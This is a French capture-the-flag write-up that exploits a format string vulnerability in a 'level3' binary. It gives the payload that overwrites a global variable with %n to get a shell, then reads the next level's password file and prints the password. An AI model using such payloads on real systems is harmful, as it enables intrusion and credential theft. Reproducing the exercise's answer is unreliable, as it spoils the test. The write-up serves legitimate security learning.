#### Etape 1: Décompilation / Compréhension du programme.

Le programme appelle une fonction *v()*
Celle-ci contient un fgets, et un printf puis compare la valeur d'une variable globale qui si elle est égale a 64 éxécute un */bin/sh*

#### Etape 2: Identification des vulnérabilités

On peut voir que fgets ne lisant qu'un certain nombre de caractère ne pourra pas être exploité pour envoyer par exemple un shellcode.
Par contre printf a seulement en argument la variable récupéré par le fgets. De ce fait il est vulnérable a une format string attack.

#### Etape 3 : Plan d'attaque

Nous pouvons donc passez au fgets l'adresse de la variable globale et faire en sorte de modifier sa valeur grâce au %n qui modifie la variable, elle devient le nombre de caractères écris auparavant.

#### Etape 4 : Récolte d'informations

Il va donc falloir trouver l'adresse de la variable globale (nommée *m* dans le binaire) sur Ghidra on obtient : 0804988c.

Il faut ensuite trouver a quel moment dans la stack la valeur que nous écrivons est appelée.

```bash
python -c 'print "aaaa" + "%x %x %x %x %x"' | ./level3
aaaa200 b7fd1ac0 b7ff37d0 61616161 25207825
```

Notre valeur est donc la 4e adresse.

Nous devrons donc écrire 64 caractére a la 4e adresse, les 3 premieres font 19 caractères. L'adresse en fait 4 il y aura donc 41 caractère a rajouté.

#### Etape 5 : Execution

```bash
python -c 'print "\x8c\x98\x04\x08"+ "a"*41 + "%x%x%x%n"' | ./level3
�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa200b7fd1ac0b7ff37d0
Wait what?!
```

Il ne reste plus qu'a rendre stdin bloquant en éxécutant le programme et print le password.

```bash
(python -c 'print "\x8c\x98\x04\x08"+ "a"*41 + "%x%x%x%n"'; cat -) | ./level3
�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa200b7fd1ac0b7ff37d0
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
